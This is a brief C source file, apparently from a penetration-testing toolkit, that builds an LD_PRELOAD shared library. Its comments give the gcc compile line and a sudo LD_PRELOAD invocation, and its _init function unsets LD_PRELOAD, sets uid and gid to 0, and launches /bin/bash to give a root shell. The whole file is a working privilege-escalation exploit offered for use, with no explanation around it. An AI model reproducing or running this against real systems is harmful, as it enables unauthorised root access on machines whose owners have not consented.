// Compile:
// gcc -fPIC -shared -o shell.so ld_preload_shell.c -nostartfiles
// Run:
// sudo LD_PRELOAD=/full/path/shell.so [COMMAND FOR ESCALATION]


#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
	unsetenv("LD_PRELOAD");
	setgid(0);
	setuid(0);
	system("/bin/bash");
}
